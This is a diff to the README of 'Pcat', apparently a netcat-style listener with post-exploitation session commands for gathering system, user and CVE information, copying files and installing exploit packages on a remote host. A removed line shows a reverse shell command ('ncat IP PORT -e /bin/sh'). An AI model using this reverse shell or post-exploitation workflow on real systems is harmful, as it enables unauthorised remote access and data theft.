@@ -85,27 +85,22 @@ Options taking a time assume seconds. Append 'ms' for milliseconds,
       --ssl-servername       Request distinct server name (SNI)
       --ssl-alpn             ALPN protocol list to use
       --version              Display Pcat's version information and exit
-
-Session:
-
- post set  bsd|linux|windows                      set post on remote system memory
-      show system|users|process|network|pe|cve    show information
-      push FILE FILE                              copy local FILE to remote FILE (windows <= 4MB)
-      pull FILE FILE                              copy remote FILE to local FILE
-      put  tools DIR                              install static binaries package on DIR
-           exploits DIR                           install exploit sources package on DIR
-      help                                        show help
-
-      Windows need a powershell reverse shell.
 ```
 ##### SESSION
 
 ```shell
-local:  pcat -l IP PORT
-remote: ncat IP PORT -e /bin/sh
+post set  bsd|linux|windows                      set post on remote system memory
+     show system|users|process|network|pe|cve    show information
+     push FILE FILE                              copy local FILE to remote FILE (windows <= 4MB)
+     pull FILE FILE                              copy remote FILE to local FILE
+     put  tools DIR                              install static binaries package on DIR
+          exploits DIR                           install exploit sources package on DIR
+     help                                        show help
+```
+##### EXAMPLE
 
-shell: post set linux
-shell: post show system
+```shell
+user@host: post show system
 
 HOST
     NAME ............ host
